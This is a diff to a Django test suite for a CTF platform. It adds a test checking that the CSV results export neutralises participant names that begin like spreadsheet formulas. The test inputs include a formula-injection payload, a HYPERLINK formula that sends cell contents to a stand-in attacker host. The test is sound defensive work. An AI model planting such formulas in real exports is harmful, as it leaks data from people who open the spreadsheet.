@@ -2,6 +2,9 @@
 
 from __future__ import annotations
 
+import csv
+import io
+
 import pytest
 from django.utils import timezone
 
@@ -216,6 +219,32 @@ class TestResultsExport:
         )
         assert csv_response["Content-Type"] == "text/csv"
         assert b"Scored,150,2" in csv_response.content
+
+    def test_csv_neutralizes_participant_controlled_formulas(self, ctf_event_active, authenticated_organizer_client):
+        """A display name that starts like a spreadsheet formula exports as literal text (#2617)."""
+        names = ['=HYPERLINK("https://attacker.example/?d="&A3,"x")', "+1+1", "-2", "@SUM(1)", "\tTabbed"]
+        for index, name in enumerate(names):
+            CTFParticipant.objects.create(
+                event=ctf_event_active,
+                name=name,
+                email=f"formula{index}@example.com",
+                status="active",
+                registered_at=timezone.now(),
+                cached_score=10 + index,
+                cached_solve_count=1,
+            )
+
+        content = call_json(
+            authenticated_organizer_client,
+            "get",
+            "api_results_export",
+            kwargs={"event_id": ctf_event_active.id},
+            query="?fmt=csv",
+        ).content.decode()
+
+        rows = list(csv.reader(io.StringIO(content)))
+        assert {row[1] for row in rows if len(row) == 4} >= {f"'{name}" for name in names}
+        assert not any(cell.startswith(("=", "+", "-", "@", "\t")) for row in rows for cell in row)
 
 
 class TestWebhooks:
